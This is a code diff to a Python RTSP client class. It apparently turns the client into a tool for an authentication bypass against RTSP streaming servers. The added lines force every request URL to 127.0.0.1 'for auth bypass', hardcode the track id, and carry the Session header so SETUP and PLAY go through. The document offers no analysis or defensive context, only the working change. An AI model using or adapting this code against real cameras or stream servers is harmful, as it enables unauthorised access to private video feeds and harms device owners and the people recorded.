@@ -46,7 +46,9 @@ class RTSPClient:
         regex = r'a=control:(.*)/(?P<trackid>\w+=\d+)'
         match = re.search(regex, response.body, re.S)
 
-        return match.group('trackid')
+        # ignore trackId
+        #return match.group('trackid')
+        return ""
 
     @staticmethod
     def _parse_digest_auth_header(header):
@@ -78,8 +80,9 @@ class RTSPClient:
         self.password = parsed.password
         self.port = parsed.port
         self.path = parsed.path
-        self.safe_url = f'rtsp://{self.host}:{self.port}{self.path}'
-        self.__url = url
+        # always set url to 127.0.0.1 for auth bypass
+        self.safe_url = f'rtsp://127.0.0.1:{self.port}{self.path}'
+        self.__url = self.safe_url
 
     def _next_cseq(self):
         self._cseq += 1
@@ -180,7 +183,8 @@ class RTSPClient:
         return response
 
     def setup(self, rtp_port):
-        trackid = self._parse_trackid(self.describe())
+        # overwrite simply with static "track1"
+        trackid = "track1"#self._parse_trackid(self.describe())
 
         response = self._request(
             method='setup',
@@ -193,6 +197,8 @@ class RTSPClient:
             raise RTSPClientError(
                 f'Failed to setup stream for {self.url}')
 
+        # Parse out Session header
+        self._session = response.headers['Session'].split(';')[0]
         return response
 
     def play(self, npt="0.000-"):
@@ -200,7 +206,8 @@ class RTSPClient:
             method='play',
             url=self.safe_url,
             headers={
-                'Range': f'npt="{npt}"'
+                'Range': f'npt="{npt}"',
+                'Session': self._session # add session
             })
 
         if response.status != 200:
